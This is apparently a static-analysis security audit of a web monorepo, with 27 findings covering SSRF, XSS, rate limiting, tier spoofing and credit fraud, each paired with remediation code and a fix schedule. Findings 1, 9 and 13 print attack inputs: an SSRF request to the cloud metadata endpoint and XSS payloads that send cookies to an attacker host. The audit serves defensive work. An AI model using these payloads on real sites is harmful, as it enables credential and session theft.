# Security Audit — Moveee Monorepo
**Date:** 2026-06-11  
**Scope:** `apps/site`, `apps/connect`, `packages/shared`, `culture-community` plugin  
**Method:** Static analysis of source code — all findings reference actual code locations.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 5 |
| High     | 10 |
| Medium   | 8 |
| Low      | 4 |
| **Total**| **27** |

---

## Findings

---

### 1: Critical | SSRF — Unrestricted Server-Side Fetch in Link Preview

- **Location:** `packages/shared/lib/og-scraper.ts:16` — `scrapeOgTags()` called by both `apps/connect/app/api/community/link-preview/route.ts` and `apps/site/app/api/community/link-preview/route.ts`
- **The Loophole:** `scrapeOgTags()` performs `fetch(url, ...)` where `url` is the raw, unvalidated query parameter from the request. Zero protocol filtering or private IP blocklist exists.
- **Exploitation/Failure Scenario:**
  1. Attacker calls `GET /api/community/link-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  2. Vercel's serverless runtime resolves the request to AWS IMDS.
  3. AWS returns IAM credential JSON for the execution role.
  4. Alternatively: target internal Redis, WordPress admin endpoints, or any VPC-internal service.
- **Impact:** Full cloud credential compromise; internal service enumeration; data exfiltration.
- **Remediation:**
  ```typescript
  const BLOCKED = /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.|::1)/;
  function isSafeUrl(raw: string): boolean {
    try {
      const u = new URL(raw);
      if (!["http:", "https:"].includes(u.protocol)) return false;
      if (BLOCKED.test(u.hostname)) return false;
      return true;
    } catch { return false; }
  }
  // Add at top of scrapeOgTags():
  if (!isSafeUrl(url)) return empty;
  ```

---

### 2: Critical | Client-Controlled Tier Escalation in Community Post Submit

- **Location:** `apps/connect/app/api/community/submit/route.ts:25,130`
- **The Loophole:** `authorTier` is accepted from the client request body and takes precedence over the session tier: `(authorTier?.trim() || sessionTier)`. A Citizen member sends `authorTier: "patron"` to impersonate Connect Pro.
- **Exploitation/Failure Scenario:**
  1. Citizen user POSTs `{ text: "...", authorTier: "patron" }`.
  2. Server writes `community_author_tier: "patron"` to post meta.
  3. Post renders with Pro badge; any tier-gated logic reading this meta value is bypassed.
- **Impact:** Tier spoofing; Pro feature bypass; brand integrity damage.
- **Remediation:** Remove `authorTier` from destructuring entirely. Always use:
  ```typescript
  community_author_tier: sessionTier,
  ```

---

### 3: Critical | Client-Controlled Credit/Reputation Amounts in Points Award

- **Location:** `apps/connect/app/api/points/award/route.ts:18-22`
- **The Loophole:** `credits` and `reputation` amounts come directly from the client request body and are forwarded to WordPress with no server-side allowlist. Any authenticated user can send `{ action: "post", credits: 99999, reputation: 99999 }`.
- **Exploitation/Failure Scenario:**
  1. Authenticated user POSTs `{ action: "community_post", credits: 50, reputation: 500 }`.
  2. WordPress awards the caller-specified amounts without validation.
  3. User accumulates arbitrary credits → cashout for real money.
- **Impact:** Financial fraud via unearned credit cashout; gamification system destroyed.
- **Remediation:** Remove `credits` and `reputation` from the accepted body. Define amounts server-side in a lookup table:
  ```typescript
  const AWARD_TABLE: Record<string, { credits: number; reputation: number }> = {
    community_post: { credits: 5, reputation: 10 },
    comment_posted: { credits: 2, reputation: 5 },
  };
  const amounts = AWARD_TABLE[action];
  if (!amounts) return NextResponse.json({ error: "Invalid action." }, { status: 400 });
  ```

---

### 4: Critical | `CULTURE_API_SECRET` Passed as URL Query Parameter

- **Location:** `apps/site/app/api/admin/migrate-community-posts/route.ts` (check for `?key=` pattern)
- **The Loophole:** The master API secret appears as a URL query parameter in at least one admin route. URL query parameters are logged verbatim by Varnish, Apache, Nginx, and Vercel access logs. This is the same secret used to authenticate every `api_key_permission`-protected WordPress endpoint.
- **Exploitation/Failure Scenario:**
  1. Secret appears in `/var/log/bitnami/access.log` on the Lightsail server.
  2. Attacker with server log access extracts the secret.
  3. Direct calls to cashout-approve, user-update, admin endpoints bypass all Next.js auth.
- **Impact:** Complete backend compromise; financial fraud; mass user data access.
- **Remediation:** Move to `Authorization: Bearer` header. Rotate `CULTURE_API_SECRET` immediately after fixing.

---

### 5: Critical | No Rate Limiting on User Registration (Account/Credit Farming)

- **Location:** `apps/connect/app/api/register/route.ts` (entire file)
- **The Loophole:** No rate limiting at the Next.js layer. Any IP can create unlimited accounts. Each account triggers welcome emails and may receive registration credits.
- **Exploitation/Failure Scenario:**
  1. Bot creates 1,000 accounts in 60 seconds.
  2. 1,000 welcome emails sent → SMTP deliverability damage + cost.
  3. If registration awards credits, 50,000+ credits farmed for cashout.
  4. WordPress user table degrades under load.
- **Impact:** SMTP cost explosion; financial fraud via credit farming; database degradation.
- **Remediation:**
  ```typescript
  import { Ratelimit } from "@upstash/ratelimit";
  import { kv } from "@vercel/kv";
  const ratelimit = new Ratelimit({ redis: kv, limiter: Ratelimit.slidingWindow(5, "1h") });
  const ip = req.headers.get("x-forwarded-for") ?? "unknown";
  const { success } = await ratelimit.limit(`register:${ip}`);
  if (!success) return Response.json({ error: "Too many requests." }, { status: 429 });
  ```

---

### 6: High | No Rate Limiting on Newsletter Subscribe (Email Bombing / Cost Attack)

- **Location:** `apps/site/app/api/newsletter/subscribe/route.ts` (entire file)
- **The Loophole:** Public endpoint, no auth required, no rate limit. WordPress subscriber store has no size limit. The `list` and `segment` fields are not validated against allowlists at the Next.js layer.
- **Exploitation/Failure Scenario:**
  1. Bot submits `victim@example.com` 10,000 times → inbox flooded with confirmation emails.
  2. Separately, 100,000 fake subscribers added → next newsletter send triggers massive SES bill.
  3. WordPress `culture_newsletter_subscribers` option serializes to 10MB+ → crashes on every WP page load.
- **Impact:** $100s–$1000s SMTP cost; WordPress DB corruption; user harassment.
- **Remediation:** Add IP rate limit (3/hour) + email-level dedup check + `list`/`segment` allowlist validation at the Next.js layer.

---

### 7: High | Admin Seed Endpoints Bypass When `PULSE_ADMIN_EMAILS` Is Unset

- **Location:** `apps/connect/app/api/events/admin-seed/route.ts:23-28`; same pattern in `pulse/admin-refresh`
- **The Loophole:** The guard `if (allowlist) { ... check ... }` only runs when the env var exists. Missing env var = no check = any authenticated user triggers the full AI seeder (Gemini + Serper + WP writes, up to 300s).
- **Exploitation/Failure Scenario:**
  1. Staging environment deployed without `PULSE_ADMIN_EMAILS`.
  2. Any logged-in member POSTs to `/api/events/admin-seed`.
  3. Full city seeder drains Gemini/Serper quota and writes junk events to production WP.
- **Impact:** AI API cost runaway; content pollution; rate limit exhaustion blocking legitimate cron.
- **Remediation:** Fail closed:
  ```typescript
  const allowlist = process.env.PULSE_ADMIN_EMAILS;
  if (!allowlist) return NextResponse.json({ error: "Admin not configured." }, { status: 403 });
  const allowed = allowlist.split(",").map(e => e.trim().toLowerCase());
  if (!allowed.includes(session.user.email!.toLowerCase())) {
    return NextResponse.json({ error: "Not authorised." }, { status: 403 });
  }
  ```

---

### 8: High | Unauthenticated AI Generation Endpoint (Gemini Billing DoS)

- **Location:** `apps/site/app/api/directory/generate/route.ts` (entire file)
- **The Loophole:** No `getServerSession` call. Any anonymous internet user can POST to this endpoint and trigger a Gemini API call.
- **Exploitation/Failure Scenario:**
  1. Botnet sends 1,000 concurrent POST requests.
  2. Each triggers a ~2,000-token Gemini generation.
  3. Google bills per token → significant cost in minutes; Gemini rate limits block legitimate seeder.
- **Impact:** Unbounded Gemini API billing; DoS on legitimate content seeding.
- **Remediation:** Add session auth check:
  ```typescript
  const session = await getServerSession(authOptions);
  if (!session?.user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  ```

---

### 9: High | XSS — `dangerouslySetInnerHTML` on Unsanitized Content from WordPress/Users

- **Location (representative):**
  - `packages/shared/components/pulse/FeedCard.tsx:692,969` — `item.body` (community post body)
  - `packages/shared/components/DirectoryGrid.tsx:118` — `entry.title`
  - `apps/connect/app/events/components/DiscoveredEventPage.tsx:131,209` — `event.title`, `event.content`
  - `apps/connect/app/vendor/orders/[id]/page.tsx:286` — `n.note` (WP order note)
- **The Loophole:** Raw HTML from WordPress (and user-submitted content) injected via `dangerouslySetInnerHTML` without DOMPurify. WPGraphQL does not auto-escape CPT meta fields.
- **Exploitation/Failure Scenario:**
  1. Admin saves event with `title: '<img src=x onerror="fetch(`https://attacker.com/?c=`+document.cookie)">'`.
  2. Every events page visitor executes the payload → session tokens exfiltrated.
- **Impact:** Session hijacking; account takeover at scale.
- **Remediation:** Install `isomorphic-dompurify` and wrap every instance:
  ```typescript
  import DOMPurify from "isomorphic-dompurify";
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }}
  // For titles — strip all tags:
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(title, { ALLOWED_TAGS: [] }) }}
  ```

---

### 10: High | Race Condition in Credit Award — No Atomic Daily Cap

- **Location:** `culture-community/includes/core/class-culture-gamification.php` — `award_points()` / `award_credits()`
- **The Loophole:** Daily cap is checked by reading usermeta, comparing, then inserting a ledger row — classic TOCTOU. No DB transaction or row-level lock wraps the read-check-write.
- **Exploitation/Failure Scenario:**
  1. Attacker sends 20 simultaneous POST `/api/community/submit` requests.
  2. All 20 read `today_credits = 0` before any write completes.
  3. All 20 pass the cap check and insert ledger rows → user receives 20× intended award.
  4. Repeat daily to accumulate cashout-eligible credits.
- **Impact:** Financial fraud via cashout of race-condition credits.
- **Remediation:**
  ```php
  $wpdb->query("START TRANSACTION");
  $today_total = (int) $wpdb->get_var($wpdb->prepare(
    "SELECT SUM(amount) FROM {$ledger} WHERE user_id=%d AND action_date=CURDATE() FOR UPDATE",
    $user_id
  ));
  if ($today_total + $amount > self::DAILY_CREDIT_CAP) {
    $wpdb->query("ROLLBACK");
    return false;
  }
  $wpdb->insert($ledger, [...]);
  $wpdb->query("COMMIT");
  ```

---

### 11: High | `err.message` Leaked to Clients in Multiple API Routes

- **Location:**
  - `apps/connect/app/api/points/award/route.ts:41` — `{ error: err.message }`
  - `apps/connect/app/api/quotes/auto-populate/route.ts:158`
  - `apps/connect/app/api/quotes/audit/route.ts:96`
  - `apps/connect/app/api/community/comment/route.ts:61`
  - `apps/connect/app/api/user/profile/route.ts:126`
- **The Loophole:** Raw JavaScript `Error.message` returned in JSON responses — often contains internal hostnames, VPC IPs, database connection strings, and API service names.
- **Exploitation/Failure Scenario:**
  1. Trigger failure in `points/award` with malformed body.
  2. Response: `{ "error": "fetch failed: ECONNREFUSED 10.0.1.5:80" }` — VPC IP revealed.
- **Impact:** Internal topology disclosure; facilitates targeted network attacks.
- **Remediation:**
  ```typescript
  } catch (err: any) {
    console.error("[endpoint] error:", err);
    return NextResponse.json({ error: "Service temporarily unavailable." }, { status: 500 });
  }
  ```

---

### 12: High | Poll Vote Uses WP Cookie Auth — Unauthenticated Votes Possible

- **Location:** `apps/connect/app/api/community/poll-vote/route.ts:28-35`
- **The Loophole:** Vote is submitted by passing `user.wpCookie` from the session as a `Cookie` header to WordPress. `wpCookie` is often empty (passkey logins, new sessions). When empty, the request hits WordPress anonymously — the Next.js session check passes, but the actual vote is unauthenticated.
- **Exploitation/Failure Scenario:**
  1. User logs in via passkey → `wpCookie` is `""`.
  2. POSTs to `/api/community/poll-vote` — passes Next.js auth, arrives at WP with empty Cookie.
  3. WP accepts the anonymous vote → unlimited poll stuffing from one authenticated Next.js session.
- **Impact:** Poll manipulation; community trust undermined.
- **Remediation:** Use the API Secret pattern and pass verified `user_id` server-side:
  ```typescript
  headers: {
    "Content-Type": "application/json",
    "Authorization": `Bearer ${process.env.CULTURE_API_SECRET}`,
  },
  body: JSON.stringify({ post_id, option_index, user_id: session.user.id }),
  ```

---

### 13: High | Community Post HTML Built from Unsanitized User Input

- **Location:** `apps/connect/app/api/community/submit/route.ts:112`
- **The Loophole:** `const htmlContent = \`<p>${content.replace(/\n/g, "</p><p>")}</p>\`` — no HTML entity encoding. Input `Hello</p><script>alert(1)</script><p>world` produces valid script tags in stored content.
- **Exploitation/Failure Scenario:**
  1. User submits: `text: "test</p><img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)><p>"`
  2. Stored verbatim in WordPress; surfaced via REST API to mobile app and any `dangerouslySetInnerHTML` render.
- **Impact:** Stored XSS; amplifies Finding 9.
- **Remediation:**
  ```typescript
  function escHtml(s: string) {
    return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
            .replace(/"/g,"&quot;").replace(/'/g,"&#39;");
  }
  const htmlContent = `<p>${escHtml(content).replace(/\n/g, "</p><p>")}</p>`;
  ```

---

### 14: High | No Rate Limiting on Forgot Password (Email Bombing)

- **Location:** `apps/connect/app/api/forgot-password/route.ts` (entire file)
- **The Loophole:** No rate limiting. Any IP can submit any email address repeatedly, flooding the victim with reset emails and damaging SMTP deliverability.
- **Impact:** Email harassment; SMTP deliverability damage; denial of password reset for legitimate users.
- **Remediation:** Rate limit to 3 requests per email per hour, 10 per IP per hour.

---

### 15: High | `X-Culture-API-Secret` Fallback Header Logged in Plain Text

- **Location:** `culture-community/includes/api/class-culture-rest-api.php:1331-1336`
- **The Loophole:** Authentication accepts `$_SERVER['HTTP_X_CULTURE_API_SECRET']` as a fallback. This means the master API secret is transmitted as a custom header on every API call. Varnish and Apache access logs on the Lightsail server record all headers → secret appears in `/var/log/bitnami/access.log` in plaintext.
- **Impact:** Secret extraction from logs → complete backend API compromise.
- **Remediation:** Remove the `X-Culture-API-Secret` fallback. Fix Apache header passthrough instead:
  ```apache
  SetEnvIf Authorization "(.*)" HTTP_AUTHORIZATION=$1
  ```
  Then delete lines 1331–1336 from `verify_bearer_token()`.

---

### 16: Medium | `NEXTAUTH_SECRET` Missing Causes Predictable JWT Signing Key

- **Location:** `packages/shared/lib/auth.ts:252` — `secret: process.env.NEXTAUTH_SECRET`
- **The Loophole:** If unset, NextAuth v4 derives a fallback secret from `NEXTAUTH_URL` — predictable and forgeable.
- **Impact:** JWT forgery → complete auth bypass on misconfigured deployments.
- **Remediation:**
  ```typescript
  if (!process.env.NEXTAUTH_SECRET) throw new Error("NEXTAUTH_SECRET is required.");
  ```

---

### 17: Medium | Session Cookie Not Configured for Cross-Subdomain Auth

- **Location:** `packages/shared/lib/auth.ts` — no `cookies` configuration
- **The Loophole:** Without explicit `domain: ".themoveee.com"`, cookies are scoped to the exact hostname. Users logged in on `themoveee.com` are not logged in on `web.themoveee.com`. If `domain` is later added without `sameSite` tuning, any subdomain takeover leaks session cookies.
- **Impact:** Auth fragmentation between Site A and B; session theft risk.
- **Remediation:**
  ```typescript
  cookies: {
    sessionToken: {
      name: "__Secure-next-auth.session-token",
      options: { httpOnly: true, sameSite: "lax", path: "/", secure: true, domain: ".themoveee.com" },
    },
  },
  ```

---

### 18: Medium | `admin_id` in Cashout Approve Is Caller-Supplied With No Role Check

- **Location:** `culture-community/includes/api/class-culture-rest-api.php:909-910` — `handle_cashout_approve()`
- **The Loophole:** `admin_id` is accepted from the request body with no check that this user has WP administrator role. Any integer can be submitted as the approver, corrupting audit trails.
- **Impact:** Fraudulent cashout approval with no accountable admin; audit trail corruption.
- **Remediation:**
  ```php
  $admin = get_user_by('id', $request->get_param('admin_id'));
  if (!$admin || !user_can($admin, 'manage_options')) {
    return new WP_Error('invalid_admin', 'Invalid admin.', ['status' => 403]);
  }
  ```

---

### 19: Medium | Unbounded `poll_options` Array — No Size Limit

- **Location:** `apps/connect/app/api/community/submit/route.ts:37,131`
- **The Loophole:** `poll_options` array has no count or per-item length limit. An attacker submits 10,000 options of 1,000 chars each → 10MB post meta JSON blob.
- **Impact:** Database bloat; feed page memory exhaustion; DoS via oversized posts.
- **Remediation:**
  ```typescript
  if (poll_options && (poll_options.length > 6 || poll_options.some(o => o.text.length > 100))) {
    return NextResponse.json({ error: "Max 6 options, 100 chars each." }, { status: 400 });
  }
  ```

---

### 20: Medium | No Content-Security-Policy Headers on Either App

- **Location:** `apps/site/next.config.mjs`, `apps/connect/next.config.mjs`
- **The Loophole:** Neither app sets CSP, `X-Frame-Options`, `X-Content-Type-Options`, `HSTS`, or `Referrer-Policy`. XSS payloads (Findings 9, 13) execute with zero browser-level mitigation.
- **Impact:** Amplifies all XSS findings; clickjacking possible; MIME-sniffing attacks enabled.
- **Remediation:** Add to both `next.config.mjs`:
  ```javascript
  async headers() {
    return [{
      source: "/(.*)",
      headers: [
        { key: "X-Frame-Options", value: "DENY" },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" },
        { key: "Content-Security-Policy", value: "default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' https: data:; connect-src 'self' https://cms.themoveee.com;" },
      ],
    }];
  },
  ```

---

### 21: Medium | `JSON.parse` on WordPress Meta Without Try/Catch Crashes Feed

- **Location:** `packages/shared/lib/unified-feed.ts` — `pollOptions`, `itineraryStops`, `galleryImages` lines
- **The Loophole:** `JSON.parse(m._poll_options)` etc. called without a try/catch. If any post has malformed meta (corrupted, manually edited), the entire feed fetch throws and all users see an empty or broken feed.
- **Impact:** Feed outage triggered by a single malformed post.
- **Remediation:**
  ```typescript
  function safeParse<T>(s: string | undefined): T | undefined {
    if (!s) return undefined;
    try { return JSON.parse(s) as T; } catch { return undefined; }
  }
  pollOptions: safeParse(m._poll_options),
  ```

---

### 22: Medium | Hardcoded Production CMS URL in 10+ Route Files

- **Location:** `apps/connect/app/api/quotes/create/route.ts:5`, `apps/connect/app/api/events/rsvp/route.ts:3`, `apps/site/app/api/newsletter/subscribe/route.ts:3`, and 7 more files
- **The Loophole:** `const WP_URL = "https://cms.themoveee.com/..."` hardcoded. Staging/dev environments always hit the production WordPress database, sending real emails and mutating real data.
- **Impact:** Data corruption; accidental real-user emails during development.
- **Remediation:** Replace all instances with `process.env.NEXT_PUBLIC_WP_URL ?? "https://cms.themoveee.com"`.

---

### 23: Medium | Newsletter Segment Not Validated at Next.js Layer

- **Location:** `apps/site/app/api/newsletter/subscribe/route.ts:14-15`
- **The Loophole:** `segment` is accepted as any string with only a `.trim()`. Valid values are `us`, `uk`, `ng`, `gh`, `ca`, `au`, or empty. Arbitrary values passed through may contaminate segmentation.
- **Impact:** Mailing list segmentation corruption.
- **Remediation:**
  ```typescript
  const VALID_SEGMENTS = ["us", "uk", "ng", "gh", "ca", "au", ""];
  if (segment && !VALID_SEGMENTS.includes(segment)) {
    return NextResponse.json({ error: "Invalid segment." }, { status: 400 });
  }
  ```

---

### 24: Low | JWT Contains Full PII and Financial Data — Unencrypted

- **Location:** `packages/shared/lib/auth.ts:163-212` — `jwt()` callback
- **The Loophole:** JWT stores `phone`, `whatsapp`, `dateOfBirth`, `nationality`, `credits`, `creditsEscrowed`, `badges`. NextAuth v4 JWT is signed but not encrypted by default. If `NEXTAUTH_SECRET` leaks, all active session tokens can be decoded for full PII + financial data of every logged-in user.
- **Impact:** Mass PII exposure in a secret-leak scenario.
- **Remediation:** Reduce JWT to `{ id, tier, username }` and fetch other fields from a short-lived cache on session read. Or enable JWT encryption via `encode`/`decode` with AES.

---

### 25: Low | Community Report Has No Rate Limit (Content Censorship Attack)

- **Location:** `apps/connect/app/api/community/report/route.ts`
- **The Loophole:** 3 unique reporters auto-remove a post from the feed. With unlimited account creation (Finding 5), an attacker creates 3 accounts and silences any legitimate post.
- **Impact:** Coordinated content censorship; abuse of auto-moderation.
- **Remediation:** Rate limit reporting per user; require account age > 7 days to report; increase auto-hide threshold to 10 unique reporters over 24 hours.

---

### 26: Low | `WP_APP_PASSWORD` Basic Auth Built at Module Scope (Visible in Cold Start Logs)

- **Location:** `apps/connect/app/api/community/submit/route.ts:11-14`, `upload-image/route.ts:10-13`, `member/upload-avatar/route.ts:15-18`
- **The Loophole:** `Buffer.from(\`${WP_USERNAME}:${WP_APP_PASSWORD}\`).toString("base64")` is computed at module scope. Module-scope execution runs during cold starts and may appear in Vercel function initialization logs or error traces.
- **Impact:** WordPress credential leakage in Vercel logs.
- **Remediation:** Move the `Buffer.from(...)` construction inside the request handler function, computed per-request.

---

### 27: Low | `images.unoptimized: true` Makes `remotePatterns` Allowlist Ineffective

- **Location:** `apps/site/next.config.mjs:9`, `apps/connect/next.config.mjs:9`
- **The Loophole:** `unoptimized: true` bypasses Next.js's image optimization pipeline. The `remotePatterns` allowlist is only enforced during optimization — with optimization disabled, `<Image>` loads from any domain.
- **Impact:** `remotePatterns` provides false security; any external domain can serve images through the component.
- **Remediation:** Either remove `unoptimized: true` and configure proper optimization, or document that `remotePatterns` is not enforced and apply explicit `src` validation in components that accept dynamic image URLs.

---

## Prioritised Fix Order

| Priority | Finding # | Action | Effort |
|----------|-----------|--------|--------|
| **P0 — Immediate** | | | |
| 1 | #3 | Remove client-controlled credits/reputation from points/award | 30 min |
| 2 | #2 | Remove `authorTier` from community submit body | 5 min |
| 3 | #4 | Rotate `CULTURE_API_SECRET`; fix migrate endpoint to use Auth header | 1 hr |
| 4 | #1 | Add private IP blocklist to og-scraper | 30 min |
| **P1 — This Sprint** | | | |
| 5 | #9 + #13 | Install `isomorphic-dompurify`; sanitize all `dangerouslySetInnerHTML` | 2 hr |
| 6 | #13 (submit) | HTML-escape user text before wrapping in `<p>` tags | 15 min |
| 7 | #5 + #6 + #14 | Add Upstash rate limits to register, newsletter subscribe, forgot-password | 2 hr |
| 8 | #7 | Invert `PULSE_ADMIN_EMAILS` guard to fail-closed | 15 min |
| 9 | #8 | Add auth check to directory/generate | 10 min |
| 10 | #10 | Add MySQL transaction to credit award in PHP | 2 hr |
| **P2 — Next Sprint** | | | |
| 11 | #11 | Replace all `err.message` returns with generic messages | 1 hr |
| 12 | #15 | Remove `X-Culture-API-Secret` fallback | 30 min |
| 13 | #16 | Add `NEXTAUTH_SECRET` startup assertion | 5 min |
| 14 | #17 | Configure explicit cookie settings in authOptions | 30 min |
| 15 | #20 | Add security headers to both next.config.mjs files | 30 min |
| 16 | #21 | Wrap JSON.parse calls in unified-feed.ts | 30 min |
| 17 | #12 | Fix poll-vote to use API Secret auth with server-side user_id | 1 hr |
| **P3 — Backlog** | | | |
| 18 | #18 | Validate admin_id against WP role in cashout-approve | 30 min |
| 19 | #19 | Add poll_options count/length validation | 15 min |
| 20 | #22 | Replace hardcoded CMS URLs with env var | 1 hr |
| 21 | Remaining | Low severity findings | Ongoing |
